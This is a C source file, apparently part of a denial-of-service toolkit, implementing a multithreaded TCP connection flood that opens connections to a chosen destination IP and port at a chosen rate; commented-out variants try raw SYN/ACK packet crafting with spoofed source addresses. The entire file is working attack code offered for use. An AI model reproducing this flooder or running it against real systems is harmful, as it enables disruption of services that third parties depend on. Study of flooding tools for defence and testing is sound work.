#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../base/subnet_mask.h"
#include "../ddos/conn_flood.h"

unsigned int conn_total;
unsigned int conn_produced;
unsigned int conn_received;

unsigned int conn_per_second;
unsigned int conn_duration;

char conn_dest_ip[16];
char conn_src_ip[16];

int conn_src_ip_mask;
int conn_dest_ip_mask;

char conn_now_src_ip[16];
char conn_now_dest_ip[16];

int conn_dest_port;

//short conn_receiver_count;
//short* conn_receiving_flag;

//pthread_mutex_t *conn_recv_mutex;
//pthread_cond_t *conn_recv_cond;

//struct recv *conn_recvd;
//__u32 *conn_syn_seq;

pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t conn_cond = PTHREAD_COND_INITIALIZER;

struct timespec conn_time1, conn_time2;

void conn_flood_print_usage(int mode) {

	if (mode == 1)
		printf(
				"CONN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

/*
 * Send SYN , ACK only.
 void* generate_conn_flooding1(void *data) {
 int thread_id = *((int*) data);
 clock_t thread_clock;
 while (1) {

 pthread_mutex_lock(&conn_mutex);
 thread_clock = clock();

 int sock = make_socket(IPPROTO_TCP);

 if (conn_generated_count >= conn_total) {
 pthread_mutex_unlock(&conn_mutex);
 pthread_cond_broadcast(&conn_cond);
 return 0;
 }

 int seq = (int) (rand() % __UINT_MAXIMUM__);
 int syn_ack_seq = (int) (rand() % __UINT_MAXIMUM__);

 tcp_send_syn(sock, seq, inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
 conn_src_port, conn_dest_port);

 int orig_port = conn_src_port;

 conn_src_port++;
 if (conn_src_port >= 65000)
 conn_src_port = 10000;

 int waited_duration = ((double) (conn_global_time - thread_clock))
 / CLOCKS_PER_SEC;
 if (waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
 pthread_cond_wait(&conn_cond, &conn_mutex);

 tcp_send_ack(sock, seq, syn_ack_seq, inet_addr(conn_src_ip),
 inet_addr(conn_dest_ip), orig_port, conn_dest_port);

 conn_produced++;
 conn_total++;

 close(sock);
 pthread_cond_signal(&conn_cond);
 pthread_mutex_unlock(&conn_mutex);
 }

 return 0;

 }
 */

void* generate_conn_flooding2(void *data) {
	int thread_id = *((int*) data);

	while (1) {

		pthread_mutex_lock(&conn_mutex);

		//Conditions begin.
		if (conn_produced >= conn_per_second) {
			pthread_cond_wait(&conn_cond, &conn_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &conn_time2);
		double conn_elapsed_time = (conn_time2.tv_sec - conn_time1.tv_sec)
				+ ((conn_time2.tv_nsec - conn_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (conn_elapsed_time >= 1.0) {

			printf("-.\n");
			conn_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &conn_time1);
			pthread_cond_signal(&conn_cond);
		}

		int sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == -1)
			perror("sock creation failed\n");

		struct sockaddr_in servaddr;
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr = inet_addr(conn_dest_ip);
		servaddr.sin_port = htons(conn_dest_port);

		if (connect(sock, (struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
			perror("connect failed\n");

		conn_produced++;
		conn_total++;
		printf("%d connected\n",conn_produced);

		pthread_mutex_unlock(&conn_mutex);
	}

	return 0;
}
void* conn_time_check(void *data) {

	while (1) {
		pthread_mutex_lock(&conn_mutex);
		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &conn_time2);
		double conn_elapsed_time = (conn_time2.tv_sec - conn_time1.tv_sec)
				+ ((conn_time2.tv_nsec - conn_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (conn_elapsed_time >= 1.0) {

			printf("-.\n");
			conn_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &conn_time1);
			pthread_cond_signal(&conn_cond);
		}
		pthread_mutex_unlock(&conn_mutex);
	}
}

/* Failed attempt to
 * 1. Send manually generated SYN packet
 * 2. Get SYN/ACK from server.
 * 3. Parse information in the response to make working ACK.
 */

/*
 void* generate_conn_flooding3(void *data) {
 int thread_id = *((int*) data);
 int sock = make_socket(IPPROTO_TCP);
 while (1) {

 struct iphdr ipv4_h;
 ipv4_h = prepare_empty_ipv4();
 ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
 ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(conn_src_ip));

 //modify tcpsyn_src_ip, increment 1.
 //next_ip_addr(tcpsyn_src_ip, 1);

 ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(conn_dest_ip));

 struct tcphdr tcp_h;
 tcp_h = prepare_empty_tcp();
 tcp_h = tcp_set_source(tcp_h, conn_src_port);
 tcp_h = tcp_set_dest(tcp_h, conn_dest_port);
 int seq = rand()%100000000;
 tcp_h = tcp_set_seq(tcp_h, seq);
 conn_syn_seq[thread_id] = seq;
 //tcp_h = tcp_set_ack_seq(tcp_h,35623);

 tcp_h = tcp_set_syn_flag(tcp_h);

 tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

 ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
 char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

 pthread_mutex_lock(&conn_mutex);

 if (conn_elapsed_time >= conn_duration) {
 pthread_mutex_unlock(&conn_mutex);
 pthread_cond_broadcast(&conn_cond);
 conn_timed_finisher=1;
 return 0;
 }

 if (conn_produced == conn_per_second) {
 pthread_cond_wait(&conn_cond, &conn_mutex);
 }
 printf("SEND [SYN] seq:%d\n",conn_syn_seq[thread_id]);
 send_packet(sock, ipv4_h, packet,conn_dest_port);
 conn_generated_count++;
 free(packet);

 conn_receiving_flag[thread_id]=1;
 conn_recvd[thread_id].socket = sock;

 if(conn_receiving_flag[thread_id]==1)
 pthread_cond_wait(&conn_cond,&conn_mutex);

 ipv4_h = prepare_empty_ipv4();
 ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
 ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(conn_src_ip));

 //modify tcpsyn_src_ip, increment 1.
 //next_ip_addr(tcpsyn_src_ip, 1);

 ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(conn_dest_ip));

 tcp_h = prepare_empty_tcp();
 tcp_h = tcp_set_source(tcp_h, conn_src_port);
 tcp_h = tcp_set_dest(tcp_h, conn_dest_port);
 tcp_h = tcp_set_seq(tcp_h, conn_recvd[thread_id].ack_seq_num);
 tcp_h = tcp_set_ack_seq(tcp_h,conn_recvd[thread_id].seq_num+1);

 tcp_h = tcp_set_ack_flag(tcp_h);

 tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

 ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
 packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));


 printf("SEND [2] \n");
 send_packet(sock, ipv4_h, packet, conn_dest_port);
 conn_generated_count++;
 free(packet);

 conn_produced++;
 conn_total++;

 conn_src_port++;
 //conn_dest_port++;

 pthread_mutex_unlock(&conn_mutex);
 }
 close(sock);
 return 0;
 }
 */

/*
 * 1. Send SYN
 * 2. Guess what SYN/ACK would be like;
 * 3. Make ACK from predicted SYN/ACK then send to server.
 */

/*
 void* generate_conn_flooding4(void *data) {
 int thread_id = *((int*) data);
 clock_t thread_clock;
 while (1) {



 pthread_mutex_lock(&conn_mutex);
 thread_clock = clock();


 int sock = make_socket(IPPROTO_TCP);
 conn_elapsed_time = ((double) (thread_clock - conn_global_elapsed_time))
 / CLOCKS_PER_SEC;

 if (conn_elapsed_time >= conn_duration) {
 pthread_mutex_unlock(&conn_mutex);
 pthread_cond_broadcast(&conn_cond);
 conn_timed_finisher=1;
 return 0;
 }

 if (conn_produced >= conn_per_second) {
 pthread_cond_wait(&conn_cond, &conn_mutex);
 }


 int seq = (int)(rand()%__UINT_MAXIMUM__);
 int syn_ack_seq =  (int)(rand()%__UINT_MAXIMUM__);

 tcp_send_syn(sock,seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
 conn_src_port, conn_dest_port);

 int orig_port = conn_src_port;

 conn_src_port++;
 if(conn_src_port >= 65000)
 conn_src_port= 10000;

 int waited_duration = ((double) (conn_global_time - thread_clock)) / CLOCKS_PER_SEC;
 if(waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
 pthread_cond_wait(&conn_cond, &conn_mutex);



 tcp_send_ack(sock,seq,syn_ack_seq,inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
 orig_port, conn_dest_port);

 conn_produced++;
 conn_total++;
 conn_generated_count++;

 close(sock);
 pthread_cond_signal(&conn_cond);
 pthread_mutex_unlock(&conn_mutex);

 }
 return 0;
 }
 */

/*
 void* receive_conn(void *data) {
 int thread_id = conn_receiver_count;
 conn_receiver_count ++;

 while(1)
 {
 pthread_mutex_lock(&conn_mutex);
 while(conn_receiving_flag[thread_id]==0)
 pthread_cond_wait(&conn_cond,&conn_mutex);
 printf("RECEIVER START id:%d \n",thread_id);

 unsigned char data[__MAX_RECV_MSG_LENGTH__];

 while(1){


 conn_recvd[thread_id] = get_response(conn_recvd[thread_id].socket);

 packet_dismantle(conn_recvd[thread_id],NULL,data);

 memset(&(conn_recvd[thread_id].seq_num),0,sizeof(__u32));
 memset(&(conn_recvd[thread_id].ack_seq_num),0,sizeof(__u32));

 memcpy(&(conn_recvd[thread_id].seq_num),data+4,4);
 memcpy(&(conn_recvd[thread_id].ack_seq_num),data+8,4);

 //printf("BEFORE> seq : %u, ack : %u\n",conn_recvd[thread_id].seq_num, conn_recvd[thread_id].ack_seq_num);

 conn_recvd[thread_id].seq_num = ntohl(conn_recvd[thread_id].seq_num);
 conn_recvd[thread_id].ack_seq_num = ntohl(conn_recvd[thread_id].ack_seq_num);

 printf("RECEIVED > seq : %u, ack : %u\n",conn_recvd[thread_id].seq_num, conn_recvd[thread_id].ack_seq_num);

 if(conn_recvd[thread_id].ack_seq_num == conn_syn_seq[thread_id]+1)
 {
 printf("RIGHT!\n");
 break;
 }

 break;

 }

 conn_receiving_flag[thread_id]=0;
 pthread_cond_signal(&conn_cond);

 printf("RECEIVER END id:%d \n",thread_id);
 pthread_mutex_unlock(&conn_mutex);
 }

 }
 */
void conn_flood_run(char *argv[], int mode) {

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 4) {
		conn_flood_print_usage(mode);
		return;
	}

	//ip separtion IP/mask -> IP , mask
	get_ip_from_ip_addr(argv[0], conn_src_ip);
	conn_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(conn_now_src_ip, conn_src_ip);

	get_ip_from_ip_addr(argv[1], conn_dest_ip);
	conn_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(conn_now_dest_ip, conn_dest_ip);

	conn_produced = 0;

	if (mode == 1) {
		conn_total = 0;
		conn_per_second = atoi(argv[3]);

		if (conn_per_second == 0)
			conn_per_second = __UINT_MAXIMUM__;

		conn_dest_port = atoi(argv[2]);
	}

	int num_threads = 10;

	int *generate_thread_id;
	pthread_t *generate_thread;
	//conn_receiving_flag = (short*) malloc(sizeof(short) * num_threads);
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));
	//receive_thread = (pthread_t*) malloc(sizeof(pthread_t) * (num_threads));
	//receive_thread_id = (int*) malloc(sizeof(int) * (num_threads));

	//conn_recvd = (struct recv*) malloc(sizeof(struct recv) * (num_threads));
	//conn_syn_seq = (__u32*) malloc(sizeof(__u32) * (num_threads));

	int i;

	printf("Sending CONN requests to %s using %d threads\n", conn_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	clock_gettime(CLOCK_MONOTONIC, &conn_time1);
	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_conn_flooding2,
					(void*) &generate_thread_id[i]);
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL, generate_conn_flooding2,
					(void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_conn,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, conn_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("CONN flood finished\nTotal %d packets sent.\n", conn_total);

	pthread_mutex_destroy(&conn_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);

	return;
}
